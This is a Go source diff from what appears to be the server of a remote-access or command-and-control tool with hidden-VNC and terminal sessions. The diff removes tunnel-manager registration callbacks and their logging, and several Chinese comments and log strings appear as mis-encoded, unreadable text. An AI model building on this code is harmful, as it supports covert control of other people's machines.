@@ -28,8 +28,6 @@ var BroadcastToXTermSessions func(uid string, data []byte)
 var BroadcastToHVNCSessions func(uid, sid string, frame []byte)
 
 // 隧道管理器注册回调函数，由main.go在初始化时设置
-var RegisterTunnelConnection func(uid string, conn net.Conn)
-var UnregisterTunnelConnection func(uid string)
 
 // min returns the minimum of two integers
 func min(a, b int) int {
@@ -158,12 +156,6 @@ func HandleTcpConnectionForWithKeys(conn net.Conn, listenerType string, masterKe
 				delete(connection.ClientListenerAddr, currentUID)
 			}
 			connection.MuClientListenerType.Unlock()
-
-// 【关键修复】从隧道管理器中清理TCP连接
-			if UnregisterTunnelConnection != nil {
-				UnregisterTunnelConnection(currentUID)
-				logx.Infof("馃棏锔?[TCP鏂紑] 宸蹭粠闅ч亾绠＄悊鍣ㄤ腑娓呯悊: %s\n", currentUID[:16]+"...")
-			}
 
 // 在数据库中标记为离线
 			// LogUpdate 统一记结果日志；不用 MarkOffline——其无条件删 ClientListenerType 会破坏上方振荡修复守卫的语义
@@ -409,12 +401,6 @@ func processMessage(ctx context.Context, reader *bufio.Reader, conn net.Conn, co
 			}
 		}
 		connection.MuClientListenerType.Unlock()
-
-		// 銆愬叧閿慨澶嶃€戞敞鍐孴CP杩炴帴鍒伴毀閬撶鐞嗗櫒
-		if RegisterTunnelConnection != nil {
-			RegisterTunnelConnection(uid, conn)
-			logx.Infof("🔗 [TCP连接] 宸叉敞鍐屽埌闅ч亾绠＄悊鍣? %s\n", uid[:16]+"...")
-		}
 
 		var client database.Clients
 		exsists, _ := database.Engine.Where("uid = ?", uid).Get(&client)
